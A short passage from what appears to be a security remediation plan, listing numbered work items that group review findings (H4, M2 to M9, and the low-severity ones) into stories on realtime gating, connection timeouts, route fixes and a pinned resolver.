5. **H4 + M6.** One realtime story for content-map gating, connection timeouts and caps.
6. **M2, M3, M4.** Route fixes; M3 reuses the pinned resolver that already exists.
7. **M7, M8, M9**, then the lows as a `security-lows` backlog story.
